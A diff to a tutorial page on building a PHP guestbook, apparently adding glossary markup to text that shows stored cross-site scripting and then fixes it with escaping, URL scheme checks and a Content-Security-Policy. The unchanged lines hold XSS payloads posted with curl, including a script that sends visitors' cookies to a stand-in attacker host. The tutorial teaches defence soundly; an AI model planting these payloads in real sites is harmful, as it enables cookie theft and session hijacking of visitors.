@@ -21,15 +21,16 @@
 
         <!-- Intro -->
         <p>
-            Before comments and social media, personal sites had guestbooks: a form at the bottom
-            where visitors left their name, their website and a line or two, and a list of everyone
-            who'd signed. It's the simplest app there is that keeps what strangers type and shows it
-            to other strangers, which makes it the simplest place to learn what happens when that
-            text is HTML.
+            Before comments and social media, personal sites had guestbooks: a
+            <term def="form">form</term> at the bottom where visitors left their name, their website
+            and a line or two, and a list of everyone who'd signed. It's the simplest app there is
+            that keeps what strangers type and shows it to other strangers, which makes it the
+            simplest place to learn what happens when that text is <term def="html">HTML</term>.
         </p>
         <p>
-            You'll build it naive, sign it with a script that runs in the browser of everyone who
-            visits after you, then fix it the way every page that shows input has to be fixed.
+            You'll build it naive, sign it with a script that runs in the
+            <term def="browser">browser</term> of everyone who visits after you, then fix it the way
+            every page that shows input has to be fixed.
         </p>
 
         <!-- What you'll use -->
@@ -58,8 +59,9 @@
 
         <heading h3 id="the-storage">The Storage</heading>
         <p>
-            Entries go in a file, one JSON object per line, outside <cde>public</cde>. A new project
-            folder gets a <cde>.gitignore</cde> so the entries stay out of git:
+            Entries go in a file, one <term def="json">JSON</term> object per line, outside
+            <cde>public</cde>. A new project folder gets a <cde>.gitignore</cde> so the entries stay
+            out of git:
         </p>
         <code-block example="project-guestbook/.gitignore" />
         <p><cde>src/Guestbook.php</cde> adds entries and reads the latest ones back:</p>
@@ -67,9 +69,10 @@
         <p>
             <cde>LOCK_EX</cde> keeps two people signing at the same moment from writing over each
             other. And notice what it doesn't do: it stores exactly what was typed. That's
-            deliberate. The same text might end up in a page, an email, a CSV file or a JSON API,
-            and each one needs different escaping. So you store the original and escape it on the
-            way out, for wherever it's going.
+            deliberate. The same text might end up in a page, an email, a
+            <term def="csv">CSV</term> file or a JSON <term def="api">API</term>, and each one needs
+            different <term def="escaping">escaping</term>. So you store the original and escape it
+            on the way out, for wherever it's going.
         </p>
 
         <heading h3 id="the-naive-page">The Naive Page</heading>
@@ -92,25 +95,26 @@
         <code-block>curl --data-urlencode "message=&lt;script&gt;alert('Hacked')&lt;/script&gt;" -d 'name=Mallory' http://localhost:8000/naive.php</code-block>
         <p class="text-th-muted text-base">
             A reminder: <cde>--data-urlencode</cde> posts a field like <cde>-d</cde> does, but
-            encodes the characters that would otherwise break the form data.
+            <term def="encoding">encodes</term> the characters that would otherwise break the form
+            data.
         </p>
         <p>
             Reload the page in your browser. An alert box says "Hacked." Reload again: it says it
             again. The script is stored, and the page prints it into its own HTML, so it runs for
             every visitor, every time, until someone deletes the entry. That's stored cross-site
-            scripting, XSS.
+            scripting, <term def="xss">XSS</term>.
         </p>
         <p>
             An alert is the polite demonstration. The script runs as your site, with everything your
-            site's JavaScript can do. This one would send every visitor's readable cookies to the
-            attacker:
+            site's <term def="javascript">JavaScript</term> can do. This one would send every
+            visitor's readable <term def="cookie">cookies</term> to the attacker:
         </p>
         <!-- prettier-ignore -->
         <code-block>&lt;script&gt;new Image().src = 'https://evil.example/c?' + document.cookie&lt;/script&gt;</code-block>
         <p>
-            It could also rewrite the page, show a fake sign-in form, or make requests to your site
-            as the visitor. And you don't need a <cde>&lt;script&gt;</cde> tag at all, so blocking
-            that word gets you nothing:
+            It could also rewrite the page, show a fake sign-in form, or make
+            <term def="request">requests</term> to your site as the visitor. And you don't need a
+            <cde>&lt;script&gt;</cde> tag at all, so blocking that word gets you nothing:
         </p>
         <!-- prettier-ignore -->
         <code-block>curl --data-urlencode 'message=&lt;img src=x onerror=alert(1)&gt;' -d 'name=Mallory' http://localhost:8000/naive.php</code-block>
@@ -134,8 +138,8 @@
             <cde>e()</cde> escapes text for HTML. <cde>web_url()</cde> is for the one place escaping
             can't help: an <cde>href</cde>. <cde>javascript:alert(1)</cde> has no <cde>&lt;</cde>,
             <cde>&gt;</cde> or quotes in it, so escaping leaves it exactly as it was, and it still
-            runs. The only fix is to check the scheme and allow <cde>http</cde> and
-            <cde>https</cde> and nothing else.
+            runs. The only fix is to check the <term def="scheme">scheme</term> and allow
+            <cde>http</cde> and <cde>https</cde> and nothing else.
         </p>
         <p>Then the fixed page, <cde>public/index.php</cde>:</p>
         <code-block example="project-guestbook/public/index.php" />
@@ -158,9 +162,9 @@
             <li>
                 <strong>A Content-Security-Policy.</strong> <cde>default-src 'self'</cde> tells the
                 browser to run only scripts loaded as files from your own site, and to refuse inline
-                scripts and <cde>onerror</cde> attributes. If an escape is ever missed, the browser
-                refuses to run what slipped through. It's the seatbelt, not the brakes: escaping is
-                still the fix.
+                scripts and <cde>onerror</cde> <term def="attribute">attributes</term>. If an escape
+                is ever missed, the browser refuses to run what slipped through. It's the seatbelt,
+                not the brakes: escaping is still the fix.
             </li>
         </list>
         <p>
@@ -175,9 +179,10 @@
         <list>
             <li>
                 <strong>Escape for where it's going.</strong> <cde>htmlspecialchars()</cde> is for
-                HTML text and quoted attributes. Inside a <cde>&lt;script&gt;</cde> block, a URL, or
-                CSS, the rules are different. Use <cde>json_encode()</cde> for a value going into
-                JavaScript, and <cde>rawurlencode()</cde> for a piece of a URL.
+                HTML text and quoted attributes. Inside a <cde>&lt;script&gt;</cde> block, a
+                <term def="url">URL</term>, or <term def="css">CSS</term>, the rules are different.
+                Use <cde>json_encode()</cde> for a value going into JavaScript, and
+                <cde>rawurlencode()</cde> for a piece of a URL.
             </li>
             <li>
                 <strong>Quote your attributes.</strong> <cde>htmlspecialchars()</cde> escapes
@@ -219,7 +224,8 @@
 
         <p>
             The guestbook remembers everyone together. The next project remembers each visitor
-            separately, on the server, where they can't change it. Next: sessions.
+            separately, on the <term def="server">server</term>, where they can't change it. Next:
+            <term def="session">sessions</term>.
         </p>
 
         <!-- Next -->
